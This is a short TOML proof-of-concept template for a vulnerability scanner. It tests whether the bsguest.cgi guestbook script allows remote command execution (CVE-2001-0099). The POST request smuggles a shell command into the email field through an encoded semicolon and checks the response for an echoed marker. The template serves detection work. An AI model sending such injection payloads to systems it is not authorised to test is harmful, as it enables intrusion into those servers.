[info]
author = "ave"
description = "验证 bsguest.cgi 是否存在远程命令执行漏洞。通过 guestbook 表单的 email 参数注入 shell 元字符（分号），检测服务器是否执行了注入命令并返回输出。"
id = "POC-AVE-2001-0042"
name = "Brian Stanback bsguest.cgi 远程命令执行 PoC"
severity = "critical"
tags = ["ave-2001-0042"]
vuln_id = [
    "CVE-2001-0099",
    "AVE-2001-0042",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/bsguest.cgi"
protocol = "http"

[poc.requests.body]
content = "email=test%40ave.com%3B%20echo%20AVE_RCE_DETECTED%3B%20echo%20&name=AVE&comments=test&submit=Submit"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_RCE_DETECTED"]
